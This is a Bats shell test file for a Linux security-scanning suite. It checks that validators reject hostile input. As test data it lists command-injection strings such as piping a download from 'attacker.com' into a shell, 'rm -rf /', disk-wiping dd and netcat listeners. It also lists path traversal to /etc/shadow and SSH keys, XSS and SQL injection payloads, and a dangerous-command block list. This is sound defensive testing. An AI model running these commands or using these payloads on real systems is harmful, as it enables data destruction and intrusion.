#!/usr/bin/env bats
# Security Tests for Vulnerability Assessment
# Following Phase 1 implementation plans (lines 1859-1922)

load "test-helper"

setup() {
    setup_test_environment
    mock_external_commands
}

teardown() {
    cleanup_test_environment
}

@test "no hardcoded credentials in scripts" {
    # Check for hardcoded passwords, keys, etc.
    ! grep -r "password\|secret\|key\|token" "$PROJECT_ROOT/scripts" --include="*.sh" | grep -v "test\|example\|TEST\|Example"
    
    # Check for common credential patterns
    ! grep -r "passwd\|api_key\|auth_token\|private_key" "$PROJECT_ROOT/scripts" --include="*.sh" | grep -v "test\|example\|TEST\|Example"
    
    # Check for base64 encoded potential credentials
    ! grep -r "echo.*[A-Za-z0-9+/]{20,}.*==" "$PROJECT_ROOT/scripts" --include="*.sh" | grep -v "test\|example\|TEST\|Example"
}

@test "no hardcoded user paths in scripts" {
    # Check for hardcoded user paths
    ! grep -r "/home/frieso" "$PROJECT_ROOT/scripts" --include="*.sh"
    ! grep -r "/home/[a-zA-Z]" "$PROJECT_ROOT/scripts" --include="*.sh" | grep -v "test\|example\|TEST\|Example"
    
    # Check for hardcoded usernames
    ! grep -r "frieso" "$PROJECT_ROOT/scripts" --include="*.sh" | grep -v "test\|example\|TEST\|Example"
    
    # Check that dynamic path resolution is used instead
    grep -r "CURRENT_USER\|CURRENT_HOME\|SECURITY_SUITE_HOME" "$PROJECT_ROOT/scripts" --include="*.sh"
}

@test "proper file permissions are set" {
    setup_test_environment
    
    # Create mock setup script that sets permissions
    cat > "$TEST_DIR/setup-security-suite.sh" << 'EOF'
#!/bin/bash
# Mock Setup Script with File Permissions

USER="${USER:-$(whoami)}"
HOME="${HOME:-$(getent passwd "$USER" | cut -d: -f6)}"
SECURITY_SUITE_HOME="${SECURITY_SUITE_HOME:-$HOME/security-suite}"

# Create directory structure
mkdir -p "$SECURITY_SUITE_HOME"/{scripts,configs,logs/{daily,weekly,monthly,manual,error,audit},backups}

# Create configuration file with proper permissions
cat > "$SECURITY_SUITE_HOME/configs/security-config.conf" << CONFIG
# Test Configuration
SECURITY_SUITE_HOME="$SECURITY_SUITE_HOME"
CONFIG

chmod 600 "$SECURITY_SUITE_HOME/configs/security-config.conf"

# Create scripts with proper permissions
cat > "$SECURITY_SUITE_HOME/scripts/security-daily-scan.sh" << 'SCRIPT'
#!/bin/bash
echo "Test script"
SCRIPT

chmod 700 "$SECURITY_SUITE_HOME/scripts/security-daily-scan.sh"

# Create log files with proper permissions
touch "$SECURITY_SUITE_HOME/logs/daily/test.log"
chmod 600 "$SECURITY_SUITE_HOME/logs/daily/test.log"

echo "Setup completed"
exit 0
EOF
    
    chmod +x "$TEST_DIR/setup-security-suite.sh"
    
    # Run setup
    run "$TEST_DIR/setup-security-suite.sh"
    
    [ "$status" -eq 0 ]
    
    # Check file permissions
    [ "$(stat -c %a "$TEST_DIR/configs/security-config.conf")" = "600" ]
    [ "$(stat -c %a "$TEST_DIR/scripts/security-daily-scan.sh")" = "700" ]
    [ "$(stat -c %a "$TEST_DIR/logs/daily/test.log")" = "600" ]
    
    cleanup_test_environment
}

@test "sudo operations are properly audited" {
    setup_test_environment
    
    export LOGS_DIR="$TEST_LOGS_DIR"
    init_sudo_audit
    
    # Execute sudo operation
    sudo_execute "echo 'test'" "Test operation"
    
    # Check audit log
    [ -d "$TEST_LOGS_DIR/audit/" ]
    find "$TEST_LOGS_DIR/audit/" -name "sudo_operations_*.log" | grep -q .
    
    # Test failed sudo operation audit
    sudo_execute "invalid-command" "Invalid operation" || true
    
    # Check for audit content
    find "$TEST_LOGS_DIR/audit/" -name "sudo_operations_*.log" -exec grep -q "sudo" {} \;
    
    cleanup_test_environment
}

@test "input validation prevents injection attacks" {
    # Test various injection attempts - only test ones that should be caught by validate_security_input
    local malicious_inputs=(
        "../../../etc/passwd"
        "file with spaces.php"
        "file;rm -rf /.txt"
        "file&&nc -l 4444.txt"
    )
    
    for input in "${malicious_inputs[@]}"; do
        run validate_security_input "$input" "filename" "Test filename"
        [ "$status" -eq 1 ]  # Should reject all malicious inputs
    done
}

@test "path traversal attacks are blocked" {
    # Test various path traversal attempts
    local traversal_inputs=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "/var/log/../../etc/passwd"
        "/tmp/../../../root/.ssh/id_rsa"
        "normal/path/../../../etc/passwd"
        "/home/user/../../../etc/shadow"
    )
    
    for input in "${traversal_inputs[@]}"; do
        run validate_security_input "$input" "directory" "Test directory"
        [ "$status" -eq 1 ]  # Should reject all traversal attempts
    done
}

@test "command injection attacks are blocked" {
    # Test various command injection attempts
    local injection_inputs=(
        "normal; rm -rf /"
        "normal && rm -rf /"
        "normal | rm -rf /"
        "normal \`rm -rf /\`"
        "normal \$(rm -rf /)"
        "normal; dd if=/dev/zero of=/dev/sda"
        "normal && dd if=/dev/zero of=/dev/sda"
        "normal | nc -l 4444"
        "normal; curl attacker.com | sh"
        "normal && wget -O- attacker.com | bash"
        "normal | python -c 'import os; os.system(\"rm -rf /\")'"
    )
    
    for input in "${injection_inputs[@]}"; do
        run check_dangerous_patterns "$input"
        [ "$status" -eq 1 ]  # Should detect dangerous patterns
    done
}

@test "XSS attacks are prevented" {
    # Test various XSS attempts
    local xss_inputs=(
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert('xss')>"
        "<svg onload=alert('xss')>"
        "javascript:alert('xss')"
        "<iframe src=javascript:alert('xss')>"
        "<body onload=alert('xss')>"
        "<input onfocus=alert('xss') autofocus>"
        "<select onfocus=alert('xss') autofocus>"
        "<textarea onfocus=alert('xss') autofocus>"
        "<keygen onfocus=alert('xss') autofocus>"
        "<video><source onerror=alert('xss')>"
        "<audio src=x onerror=alert('xss')>"
    )
    
    for input in "${xss_inputs[@]}"; do
        run sanitize_input "$input" "text"
        [ "$status" -eq 0 ]
        [[ ! "$output" =~ "<script>" ]]
        [[ ! "$output" =~ "javascript:" ]]
        [[ ! "$output" =~ "onerror=" ]]
        [[ ! "$output" =~ "onload=" ]]
        [[ ! "$output" =~ "onfocus=" ]]
    done
}

@test "sudo command whitelist is enforced" {
    # Test that only whitelisted commands are allowed
    local allowed_commands=(
        "freshclam --quiet"
        "clamscan -r /home"
        "rkhunter --update"
        "rkhunter --check"
        "chkrootkit -q"
        "lynis audit system"
        "loginctl enable-linger testuser"
        "systemctl --user start security-daily-scan.timer"
        "pacman -S clamav"
        "pacman -Rns old-package"
    )
    
    for cmd in "${allowed_commands[@]}"; do
        run validate_sudo_command "$cmd"
        [ "$status" -eq 0 ]  # Should allow whitelisted commands
    done
    
    # Test that dangerous commands are blocked
    local blocked_commands=(
        "rm -rf /"
        "dd if=/dev/zero of=/dev/sda"
        "mkfs.ext4 /dev/sda1"
        "fdisk /dev/sda"
        "mount /dev/sda1 /mnt"
        "umount /"
        "shutdown -h now"
        "reboot"
        "passwd root"
        "usermod -L root"
        "chmod 777 /etc/shadow"
        "chown root:root /etc/passwd"
    )
    
    for cmd in "${blocked_commands[@]}"; do
        run validate_sudo_command "$cmd"
        [ "$status" -eq 1 ]  # Should block dangerous commands
    done
}

@test "file upload attacks are prevented" {
    # Test various file upload attack attempts
    local upload_inputs=(
        "malicious.php"
        "shell.php"
        "webshell.jsp"
        "backdoor.asp"
        "exploit.cgi"
        "payload.py"
        "attack.rb"
        "malware.exe"
        "trojan.bat"
        "virus.scr"
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "file with spaces.php"
        "file;rm -rf /.txt"
        "file&&nc -l 4444.txt"
    )
    
    for input in "${upload_inputs[@]}"; do
        run validate_security_input "$input" "filename" "Test filename"
        [ "$status" -eq 1 ]  # Should reject dangerous filenames
    done
}

@test "SQL injection attacks are prevented" {
    # Test various SQL injection attempts
    local sql_inputs=(
        "'; DROP TABLE users; --"
        "' OR '1'='1"
        "'; INSERT INTO users VALUES('hacker','password'); --"
        "' UNION SELECT * FROM passwords --"
        "'; EXEC xp_cmdshell('format c:'); --"
        "' OR 1=1 --"
        "admin'--"
        "admin' /*"
        "' OR 'x'='x"
        "1' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --"
    )
    
    for input in "${sql_inputs[@]}"; do
        run check_dangerous_patterns "$input"
        [ "$status" -eq 1 ]  # Should detect SQL injection patterns
    done
}

@test "temporary file security" {
    setup_test_environment
    
    # Create mock script that uses temporary files
    cat > "$TEST_DIR/scripts/temp-file-test.sh" << 'EOF'
#!/bin/bash
# Mock Script with Temporary File Usage

# Create temporary file securely
TEMP_FILE=$(mktemp "$TEST_DIR/tempfile.XXXXXX")
echo "Sensitive data" > "$TEMP_FILE"

# Process temporary file
while IFS= read -r line; do
    log_info "Processing: $line"
done < "$TEMP_FILE"

# Secure cleanup
shred -u "$TEMP_FILE" 2>/dev/null || rm -f "$TEMP_FILE"

log_info "Temporary file processed and cleaned up"

exit 0
EOF
    
    chmod +x "$TEST_DIR/scripts/temp-file-test.sh"
    
    # Run script
    run "$TEST_DIR/scripts/temp-file-test.sh"
    
    [ "$status" -eq 0 ]
    
    # Check that temporary files are cleaned up
    [ ! -f "$TEST_DIR/tempfile.*" ]
    
    # Check that no sensitive data remains
    ! grep -r "Sensitive data" "$TEST_DIR" 2>/dev/null
    
    cleanup_test_environment
}

@test "log file security" {
    setup_test_environment
    
    # Create mock script that generates logs
    cat > "$TEST_DIR/scripts/log-test.sh" << 'EOF'
#!/bin/bash
# Mock Script with Log Generation

# Create log file with sensitive data
LOG_FILE="$TEST_LOGS_DIR/security_test.log"
echo "Security scan log - $(date)" > "$LOG_FILE"
echo "=============================" >> "$LOG_FILE"

# Log some test data (should not contain sensitive info)
log_info "Starting security scan"
log_info "Processing user: testuser"
log_info "Scan completed successfully"

# Set secure permissions
chmod 600 "$LOG_FILE"

exit 0
EOF
    
    chmod +x "$TEST_DIR/scripts/log-test.sh"
    
    # Run script
    run "$TEST_DIR/scripts/log-test.sh"
    
    [ "$status" -eq 0 ]
    [ -f "$TEST_LOGS_DIR/security_test.log" ]
    
    # Check log file permissions
    [ "$(stat -c %a "$TEST_LOGS_DIR/security_test.log")" = "600" ]
    
    # Check that logs don't contain sensitive data
    ! grep -r "password\|secret\|key\|token" "$TEST_LOGS_DIR" 2>/dev/null
    
    cleanup_test_environment
}

@test "environment variable security" {
    setup_test_environment
    
    # Create mock script that uses environment variables
    cat > "$TEST_DIR/scripts/env-test.sh" << 'EOF'
#!/bin/bash
# Mock Script with Environment Variable Usage

# Use environment variables securely
log_info "User: ${USER:-unknown}"
log_info "Home: ${HOME:-/tmp}"
log_info "Security Suite Home: ${SECURITY_SUITE_HOME:-/tmp/security-suite}"

# Don't log sensitive environment variables
if [ -n "$PASSWORD" ]; then
    log_info "Password is set (value hidden)"
fi

if [ -n "$API_KEY" ]; then
    log_info "API key is set (value hidden)"
fi

exit 0
EOF
    
    chmod +x "$TEST_DIR/scripts/env-test.sh"
    
    # Set some sensitive environment variables
    export PASSWORD="secret123"
    export API_KEY="abc123def456"
    
    # Run script
    run "$TEST_DIR/scripts/env-test.sh"
    
    [ "$status" -eq 0 ]
    
    # Check that sensitive values are not logged
    ! grep -r "secret123" "$TEST_LOGS_DIR" 2>/dev/null
    ! grep -r "abc123def456" "$TEST_LOGS_DIR" 2>/dev/null
    
    # Check that non-sensitive values are logged - look for any log files first
    find "$TEST_LOGS_DIR" -name "*.log" -exec grep -q "User:" {} \;
    find "$TEST_LOGS_DIR" -name "*.log" -exec grep -q "Home:" {} \;
    
    # Unset sensitive variables
    unset PASSWORD
    unset API_KEY
    
    cleanup_test_environment
}
